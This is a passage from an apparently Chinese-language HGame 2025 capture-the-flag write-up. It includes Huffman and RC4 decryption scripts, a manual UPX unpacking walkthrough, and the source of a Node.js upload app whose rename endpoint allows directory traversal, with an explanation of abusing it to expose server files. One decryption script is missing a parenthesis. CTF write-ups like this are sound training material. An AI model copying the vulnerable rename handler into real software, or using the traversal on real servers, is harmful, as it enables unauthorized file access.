class="line">&#123;&quot;a&quot;:&#123;&quot;a&quot;:&#123;&quot;a&quot;:&#123;&quot;a&quot;:&#123;&quot;a&quot;:&#123;&quot;s&quot;:125&#125;,&quot;b&quot;:&#123;&quot;a&quot;:&#123;&quot;s&quot;:119&#125;,&quot;b&quot;:&#123;&quot;s&quot;:123&#125;&#125;&#125;,&quot;b&quot;:&#123;&quot;a&quot;:&#123;&quot;s&quot;:104&#125;,&quot;b&quot;:&#123;&quot;s&quot;:105&#125;&#125;&#125;,&quot;b&quot;:&#123;&quot;a&quot;:&#123;&quot;s&quot;:101&#125;,&quot;b&quot;:&#123;&quot;s&quot;:103&#125;&#125;&#125;,&quot;b&quot;:&#123;&quot;a&quot;:&#123;&quot;a&quot;:&#123;&quot;a&quot;:&#123;&quot;s&quot;:10&#125;,&quot;b&quot;:&#123;&quot;s&quot;:13&#125;&#125;,&quot;b&quot;:&#123;&quot;s&quot;:32&#125;&#125;,&quot;b&quot;:&#123;&quot;a&quot;:&#123;&quot;s&quot;:115&#125;,&quot;b&quot;:&#123;&quot;s&quot;:116&#125;&#125;&#125;&#125;,&quot;b&quot;:&#123;&quot;a&quot;:&#123;&quot;a&quot;:&#123;&quot;a&quot;:&#123;&quot;a&quot;:&#123;&quot;a&quot;:&#123;&quot;s&quot;:46&#125;,&quot;b&quot;:&#123;&quot;s&quot;:48&#125;&#125;,&quot;b&quot;:&#123;&quot;a&quot;:&#123;&quot;a&quot;:&#123;&quot;s&quot;:76&#125;,&quot;b&quot;:&#123;&quot;s&quot;:78&#125;&#125;,&quot;b&quot;:&#123;&quot;a&quot;:&#123;&quot;s&quot;:83&#125;,&quot;b&quot;:&#123;&quot;a&quot;:&#123;&quot;s&quot;:68&#125;,&quot;b&quot;:&#123;&quot;s&quot;:69&#125;&#125;&#125;&#125;&#125;,&quot;b&quot;:&#123;&quot;a&quot;:&#123;&quot;a&quot;:&#123;&quot;s&quot;:44&#125;,&quot;b&quot;:&#123;&quot;a&quot;:&#123;&quot;s&quot;:33&#125;,&quot;b&quot;:&#123;&quot;s&quot;:38&#125;&#125;&#125;,&quot;b&quot;:&#123;&quot;s&quot;:45&#125;&#125;&#125;,&quot;b&quot;:&#123;&quot;a&quot;:&#123;&quot;a&quot;:&#123;&quot;s&quot;:100&#125;,&quot;b&quot;:&#123;&quot;a&quot;:&#123;&quot;s&quot;:98&#125;,&quot;b&quot;:&#123;&quot;s&quot;:99&#125;&#125;&#125;,&quot;b&quot;:&#123;&quot;a&quot;:&#123;&quot;a&quot;:&#123;&quot;s&quot;:49&#125;,&quot;b&quot;:&#123;&quot;s&quot;:51&#125;&#125;,&quot;b&quot;:&#123;&quot;s&quot;:97&#125;&#125;&#125;&#125;,&quot;b&quot;:&#123;&quot;a&quot;:&#123;&quot;a&quot;:&#123;&quot;a&quot;:&#123;&quot;s&quot;:117&#125;,&quot;b&quot;:&#123;&quot;s&quot;:118&#125;&#125;,&quot;b&quot;:&#123;&quot;a&quot;:&#123;&quot;a&quot;:&#123;&quot;s&quot;:112&#125;,&quot;b&quot;:&#123;&quot;s&quot;:113&#125;&#125;,&quot;b&quot;:&#123;&quot;s&quot;:114&#125;&#125;&#125;,&quot;b&quot;:&#123;&quot;a&quot;:&#123;&quot;a&quot;:&#123;&quot;s&quot;:108&#125;,&quot;b&quot;:&#123;&quot;s&quot;:109&#125;&#125;,&quot;b&quot;:&#123;&quot;a&quot;:&#123;&quot;s&quot;:110&#125;,&quot;b&quot;:&#123;&quot;s&quot;:111&#125;&#125;&#125;&#125;&#125;&#125;</span><br><span class="line">00010001110111111010010000011100010111000100111000110000100010111001110010011011010101111011101100110100011101101001110111110111011011001110110011110011110110111011101101011001111011001111000111001101111000011001100001011011101100011100101001110010111001111000011000101001010000000100101000100010011111110110010111010101000111101000110110001110101011010011111111001111111011010101100001101110101101111110100100111100100010110101111111111100110001010101101110010011111000110110101101111010000011110100000110110101011000111111000110101001011100000110111100000010010100010001011100011100111001011101011111000101010110101111000001100111100011100101110101111100010110101110000010100000010110001111011100011101111110101010010011101011100100011110010010110111101110111010111110110001111010101110010001011100100101110001011010100001110101000101111010100110001110101011101100011011011000011010000001011000111011111111100010101011100000</span><br></pre></td></tr></table></figure><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode_huffman</span>(<span class="params">encoded_str, huffman_tree</span>):</span><br><span class="line">    current_node = huffman_tree</span><br><span class="line">    decoded_bytes = <span class="built_in">bytearray</span>()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> bit <span class="keyword">in</span> encoded_str:</span><br><span class="line">        <span class="keyword">if</span> bit == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">            current_node = current_node[<span class="string">&#x27;a&#x27;</span>]</span><br><span class="line">        <span class="keyword">else</span>:  <span class="comment"># bit is &#x27;1&#x27;</span></span><br><span class="line">            current_node = current_node[<span class="string">&#x27;b&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;s&#x27;</span> <span class="keyword">in</span> current_node:  <span class="comment"># Reached a leaf node</span></span><br><span class="line">            decoded_bytes.append(current_node[<span class="string">&#x27;s&#x27;</span>])</span><br><span class="line">            current_node = huffman_tree  <span class="comment"># Reset to root for next character</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(decoded_bytes)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_encoded_file</span>(<span class="params">file_path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        lines = file.readlines()</span><br><span class="line">        huffman_tree_json = lines[<span class="number">0</span>].strip()  <span class="comment"># Read the first line as Huffman tree</span></span><br><span class="line">        encoded_str = <span class="string">&#x27;&#x27;</span>.join(lines[<span class="number">1</span>:]).strip()  <span class="comment"># The rest is the encoded string</span></span><br><span class="line"></span><br><span class="line">    huffman_tree = json.loads(huffman_tree_json)</span><br><span class="line">    <span class="keyword">return</span> huffman_tree, encoded_str</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    input_file = <span class="string">&#x27;enc.txt&#x27;</span>  <span class="comment"># Path to your encoded file</span></span><br><span class="line">    output_file = <span class="string">&#x27;decoded_output.txt&#x27;</span></span><br><span class="line"></span><br><span class="line">    huffman_tree, encoded_str = read_encoded_file(input_file)</span><br><span class="line">    decoded_data = decode_huffman(encoded_str, huffman_tree)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        file.write(decoded_data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p><img src="/images/HGame2025-Writeup/image-20250204113221474.png" alt="image-20250204113221474"></p><h3 id="Turtle"><a href="#Turtle" class="headerlink" title="Turtle"></a>Turtle</h3><p>第一次做手动upx脱壳，这里就写详细一点，参考<a href="https://blog.csdn.net/Pisces50002/article/details/135169522">这篇文章</a></p><p>用x64dbg打开，查看断点</p><p><img src="/images/HGame2025-Writeup/image-20250210141759847.png" alt="image-20250210141759847"></p><p>按两次F9到push的断点</p><p><img src="/images/HGame2025-Writeup/image-20250210141935716.png" alt="image-20250210141935716"></p><p>F7单步调试走完push</p><p><img src="/images/HGame2025-Writeup/image-20250210142041244-1739693668640.png" alt="image-20250210142041244"></p><p>在RSP上点击在内存窗口中转到</p><p><img src="/images/HGame2025-Writeup/image-20250210142143973.png" alt="image-20250210142143973"></p><p>右下角设置硬件断点</p><p><img src="/images/HGame2025-Writeup/image-20250210142306180.png" alt="image-20250210142306180"></p><p>F9运行到断点处</p><p><img src="/images/HGame2025-Writeup/image-20250210142424168.png" alt="image-20250210142424168"></p><p>看到jmp，设置断点，F9</p><p><img src="/images/HGame2025-Writeup/image-20250210142550588.png" alt="image-20250210142550588"></p><p>F7步入</p><p><img src="/images/HGame2025-Writeup/image-20250210142615765.png" alt="image-20250210142615765"></p><p>这里就是程序本体，开始dump</p><p>点击scylla插件</p><p><img src="/images/HGame2025-Writeup/image-20250210142706039.png" alt="image-20250210142706039"></p><p>IAT Autosearch然后Get Imports</p><p><img src="/images/HGame2025-Writeup/image-20250210142801288.png" alt="image-20250210142801288"></p><p>删除打叉的节点</p><p><img src="/images/HGame2025-Writeup/image-20250210142836225.png" alt="image-20250210142836225"></p><p>先Dump然后对之前Dump下来的东西Fix Dump</p><p><img src="/images/HGame2025-Writeup/image-20250210143532908.png" alt="image-20250210143532908"></p><p>至此脱壳完成</p><p>接下来用IDA看一下</p><p><img src="/images/HGame2025-Writeup/image-20250210143741495.png" alt="image-20250210143741495"></p><p>跟进函数以后再分析可以得知这个程序的流程大概是先用普通RC4对密钥加密验证输入的密钥，然后用魔改过的RC4和正确的密钥对密文加密验证输入的密文</p><p>exp：</p><p>解密钥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_init</span>(<span class="params">key</span>):</span><br><span class="line">    S = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + S[i] + <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])) % <span class="number">256</span></span><br><span class="line">        S[i], S[j] = S[j], S[i]</span><br><span class="line">    <span class="keyword">return</span> S</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_encrypt</span>(<span class="params">S, plaintext</span>):</span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    output = []</span><br><span class="line">    <span class="keyword">for</span> byte <span class="keyword">in</span> plaintext:</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + S[i]) % <span class="number">256</span></span><br><span class="line">        S[i], S[j] = S[j], S[i]  <span class="comment"># swap</span></span><br><span class="line">        K = S[(S[i] + S[j]) % <span class="number">256</span>]</span><br><span class="line">        output.append(byte ^ K)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(output)</span><br><span class="line"></span><br><span class="line">ciphertext = [-<span class="number">51</span>,-<span class="number">113</span>,<span class="number">37</span>,<span class="number">61</span>,-<span class="number">31</span>]</span><br><span class="line">ciphertext_bytes = <span class="built_in">bytes</span>([x <span class="keyword">if</span> x &gt;= <span class="number">0</span> <span class="keyword">else</span> x + <span class="number">256</span> <span class="keyword">for</span> x <span class="keyword">in</span> ciphertext])+<span class="string">b&#x27;QJ&#x27;</span></span><br><span class="line">key = <span class="string">&quot;yekyek&quot;</span></span><br><span class="line">S_box = rc4_init(key)</span><br><span class="line">plaintext = rc4_encrypt(S_box, ciphertext_bytes</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;解密后的文本:&quot;</span>, plaintext)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;解密后的文本（字符串形式）:&quot;</span>, plaintext.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"><span class="keyword">except</span> UnicodeDecodeError:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;无法以UTF-8格式解码结果，可能需要其他编码格式或是二进制数据&quot;</span>)</span><br><span class="line"><span class="comment">#ecg4ab6</span></span><br></pre></td></tr></table></figure><p>解密文</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_init</span>(<span class="params">key</span>):</span><br><span class="line">    S = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + S[i] + <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])) % <span class="number">256</span></span><br><span class="line">        S[i], S[j] = S[j], S[i]</span><br><span class="line">    <span class="keyword">return</span> S</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_encrypt</span>(<span class="params">S, plaintext</span>):</span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    output = []</span><br><span class="line">    <span class="keyword">for</span> byte <span class="keyword">in</span> plaintext:</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + S[i]) % <span class="number">256</span></span><br><span class="line">        S[i], S[j] = S[j], S[i] </span><br><span class="line">        K = S[(S[i] + S[j]) % <span class="number">256</span>]</span><br><span class="line">        output.append(byte +K)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(output)):</span><br><span class="line">        output[i]=output[i]%<span class="number">256</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(output)</span><br><span class="line"></span><br><span class="line">ciphertext = [-<span class="number">8</span>, -<span class="number">43</span>, <span class="number">98</span>, -<span class="number">49</span>, <span class="number">67</span>, -<span class="number">70</span>, -<span class="number">62</span>, <span class="number">35</span>, <span class="number">21</span>, <span class="number">74</span>, <span class="number">81</span>, <span class="number">16</span>, <span class="number">39</span>, <span class="number">16</span>, -<span class="number">79</span>, -<span class="number">49</span>, -<span class="number">60</span>, <span class="number">9</span>, -<span class="number">2</span>, -<span class="number">29</span>, -<span class="number">97</span>, <span class="number">73</span>, -<span class="number">121</span>, -<span class="number">22</span>, <span class="number">89</span>, -<span class="number">62</span>, <span class="number">7</span>, <span class="number">59</span>, -<span class="number">87</span>, <span class="number">17</span>, -<span class="number">63</span>, -<span class="number">68</span>, -<span class="number">3</span>, <span class="number">75</span>, <span class="number">87</span>, -<span class="number">60</span>, <span class="number">126</span>, -<span class="number">48</span>, -<span class="number">86</span>, <span class="number">10</span>]</span><br><span class="line">ciphertext_bytes = <span class="built_in">bytes</span>([x <span class="keyword">if</span> x &gt;= <span class="number">0</span> <span class="keyword">else</span> x + <span class="number">256</span> <span class="keyword">for</span> x <span class="keyword">in</span> ciphertext])</span><br><span class="line">key = <span class="string">&quot;ecg4ab6&quot;</span></span><br><span class="line">S_box = rc4_init(key)</span><br><span class="line">plaintext = rc4_encrypt(S_box, ciphertext_bytes)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;解密后的文本:&quot;</span>, plaintext)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;解密后的文本（字符串形式）:&quot;</span>, plaintext.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"><span class="keyword">except</span> UnicodeDecodeError:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;无法以UTF-8格式解码结果，可能需要其他编码格式或是二进制数据&quot;</span>)</span><br><span class="line"><span class="comment">#hgame&#123;Y0u&#x27;r3_re4l1y_g3t_0Ut_of_th3_upX!&#125;</span></span><br></pre></td></tr></table></figure><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Level-24-Pacman"><a href="#Level-24-Pacman" class="headerlink" title="Level 24 Pacman"></a>Level 24 Pacman</h3><p>在index.js里面可以看到疑似flag的东西</p><p><img src="/images/HGame2025-Writeup/image-20250204113436711.png" alt="image-20250204113436711"></p><p><img src="/images/HGame2025-Writeup/image-20250204113512299.png" alt="image-20250204113512299"></p><h3 id="Level-47-BandBomb"><a href="#Level-47-BandBomb" class="headerlink" title="Level 47 BandBomb"></a>Level 47 BandBomb</h3><p>题目给出的app.js源码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> multer = <span class="built_in">require</span>(<span class="string">&#x27;multer&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="string">&#x27;/static&#x27;</span>, express.<span class="title function_">static</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;public&#x27;</span>)));</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">json</span>());</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> storage = multer.<span class="title function_">diskStorage</span>(&#123;</span><br><span class="line">  <span class="attr">destination</span>: <span class="function">(<span class="params">req, file, cb</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> uploadDir = <span class="string">&#x27;uploads&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (!fs.<span class="title function_">existsSync</span>(uploadDir)) &#123;</span><br><span class="line">      fs.<span class="title function_">mkdirSync</span>(uploadDir);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">cb</span>(<span class="literal">null</span>, uploadDir);</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">filename</span>: <span class="function">(<span class="params">req, file, cb</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="title function_">cb</span>(<span class="literal">null</span>, file.<span class="property">originalname</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> upload = <span class="title function_">multer</span>(&#123; </span><br><span class="line">  <span class="attr">storage</span>: storage,</span><br><span class="line">  <span class="attr">fileFilter</span>: <span class="function">(<span class="params">_, file, cb</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (!file.<span class="property">originalname</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">cb</span>(<span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;无效的文件名&#x27;</span>), <span class="literal">false</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="title function_">cb</span>(<span class="literal">null</span>, <span class="literal">true</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">      <span class="title function_">cb</span>(<span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;文件处理错误&#x27;</span>), <span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> uploadsDir = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;uploads&#x27;</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (!fs.<span class="title function_">existsSync</span>(uploadsDir)) &#123;</span><br><span class="line">    fs.<span class="title function_">mkdirSync</span>(uploadsDir);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fs.<span class="title function_">readdir</span>(uploadsDir, <span class="function">(<span class="params">err, files</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">render</span>(<span class="string">&#x27;mortis&#x27;</span>, &#123; <span class="attr">files</span>: [] &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">&#x27;mortis&#x27;</span>, &#123; <span class="attr">files</span>: files &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/upload&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  upload.<span class="title function_">single</span>(<span class="string">&#x27;file&#x27;</span>)(req, res, <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">json</span>(&#123; <span class="attr">error</span>: err.<span class="property">message</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">file</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">json</span>(&#123; <span class="attr">error</span>: <span class="string">&#x27;没有选择文件&#x27;</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    res.<span class="title function_">json</span>(&#123; </span><br><span class="line">      <span class="attr">message</span>: <span class="string">&#x27;文件上传成功&#x27;</span>,</span><br><span class="line">      <span class="attr">filename</span>: req.<span class="property">file</span>.<span class="property">filename</span> </span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/rename&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; oldName, newName &#125; = req.<span class="property">body</span>;</span><br><span class="line">  <span class="keyword">const</span> oldPath = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;uploads&#x27;</span>, oldName);</span><br><span class="line">  <span class="keyword">const</span> newPath = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;uploads&#x27;</span>, newName);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!oldName || !newName) &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">json</span>(&#123; <span class="attr">error</span>: <span class="string">&#x27; &#x27;</span> &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fs.<span class="title function_">rename</span>(oldPath, newPath, <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">json</span>(&#123; <span class="attr">error</span>: <span class="string">&#x27; &#x27;</span> + err.<span class="property">message</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    res.<span class="title function_">json</span>(&#123; <span class="attr">message</span>: <span class="string">&#x27; &#x27;</span> &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(port, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`服务器运行在 http://localhost:<span class="subst">$&#123;port&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>不难发现rename处存在目录穿越，而且可以通过访问&#x2F;static&#x2F;xxx来将对应的文件下载下来，因此我们只要利用漏洞穿越将想查看的文件放到public文件夹中即可</p><p><img src="/images/HGame2025-Writeup/image-20250206200825198.png" alt="image-20250206200825198"></p><p>访问&#x2F;static&#x2F;1.ejs得到mortis.ejs：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span 